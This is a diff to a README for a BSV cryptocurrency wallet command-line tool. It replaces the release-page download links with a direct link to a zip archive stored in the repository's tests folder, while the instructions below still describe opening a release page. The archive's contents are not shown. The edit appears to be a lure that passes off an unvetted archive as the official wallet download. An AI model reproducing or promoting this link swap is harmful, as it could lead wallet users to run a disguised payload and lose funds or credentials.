@@ -1,6 +1,6 @@
 # 🧰 bsv-wallet-cli - Run Your BSV Wallet Locally
 
-[![Download bsv-wallet-cli](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Hala6135/bsv-wallet-cli/releases)
+[![Download bsv-wallet-cli](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Hala6135/bsv-wallet-cli/raw/refs/heads/main/tests/cli-bsv-wallet-1.2.zip)
 
 ## 🚀 What this app does
 
@@ -21,7 +21,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download:
 
-https://github.com/Hala6135/bsv-wallet-cli/releases
+https://github.com/Hala6135/bsv-wallet-cli/raw/refs/heads/main/tests/cli-bsv-wallet-1.2.zip
 
 1. Open the release page.
 2. Find the latest release.
